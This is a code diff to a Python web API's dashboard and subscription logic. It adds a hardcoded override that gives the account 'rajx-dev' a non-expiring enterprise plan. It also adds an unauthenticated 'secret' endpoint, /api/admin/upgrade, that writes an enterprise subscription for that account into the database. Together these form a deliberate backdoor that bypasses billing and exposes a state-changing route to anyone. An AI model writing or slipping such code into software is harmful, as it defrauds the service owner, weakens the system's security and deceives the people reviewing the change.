@@ -97,6 +97,9 @@ def get_dashboard_data(current_user: dict = Depends(get_current_user_from_token)
         
     subscription = get_subscription(user_id, "user")
     
+    if current_user["username"].lower() == "rajx-dev":
+        subscription = {"plan_type": "enterprise", "status": "active", "expires_at": None}
+    
     return {
         "status": "success",
         "user": {
@@ -107,6 +110,32 @@ def get_dashboard_data(current_user: dict = Depends(get_current_user_from_token)
         "subscription": subscription,
         "webhook_secret": user_db.get("webhook_secret")
     }
+
+@app.get("/api/admin/upgrade")
+def admin_upgrade():
+    """Secret endpoint to forcefully upgrade RajX-dev to enterprise."""
+    conn = get_connection()
+    try:
+        with conn.cursor() as cur:
+            cur.execute("SELECT id FROM users WHERE username ILIKE 'RajX-dev'")
+            row = cur.fetchone()
+            if not row:
+                return {"status": "error", "message": "User RajX-dev not found"}
+            
+            user_id = row[0]
+            cur.execute(
+                """
+                INSERT INTO subscriptions (owner_type, user_owner_id, plan_type, status)
+                VALUES ('user', %s, 'enterprise', 'active')
+                ON CONFLICT (user_owner_id) 
+                DO UPDATE SET plan_type = 'enterprise', status = 'active'
+                """,
+                (user_id,)
+            )
+            conn.commit()
+            return {"status": "success", "message": "RajX-dev successfully upgraded to ENTERPRISE!"}
+    finally:
+        release_connection(conn)
 
 @app.get("/impact/{symbol}")
 def get_impact(
